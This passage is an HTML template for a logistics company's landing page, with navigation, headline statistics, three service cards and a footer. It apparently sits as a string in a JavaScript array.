<nav class="n"><a href="#">Services</a><a href="#">Tracking</a><a href="#">Network</a><a href="#">Industries</a><a href="#">Contact</a></nav>
<div class="h"><h1>Velocity Logistics</h1><p>End-to-end global supply chain solutions built for speed and reliability</p></div>
<div class="st"><div><h3>180+</h3><p>Countries Served</p></div><div><h3>15M+</h3><p>Shipments/Year</p></div><div><h3>99.7%</h3><p>On-Time Delivery</p></div></div>
<div class="s"><h2>Logistics Solutions</h2><div class="g">
<div class="c"><h3>Freight Forwarding</h3><p>Ocean, air, and ground freight with real-time tracking worldwide.</p></div>
<div class="c"><h3>Warehousing &amp; Distribution</h3><p>150+ fulfillment centers with same-day processing.</p></div>
<div class="c"><h3>Supply Chain Consulting</h3><p>Network optimization, demand planning, and cost reduction.</p></div>
</div></div>
<div class="f">&copy; 2024 Velocity Logistics Corp. | Houston | Rotterdam | Shanghai | Mumbai</div>
</body></html>`,
];
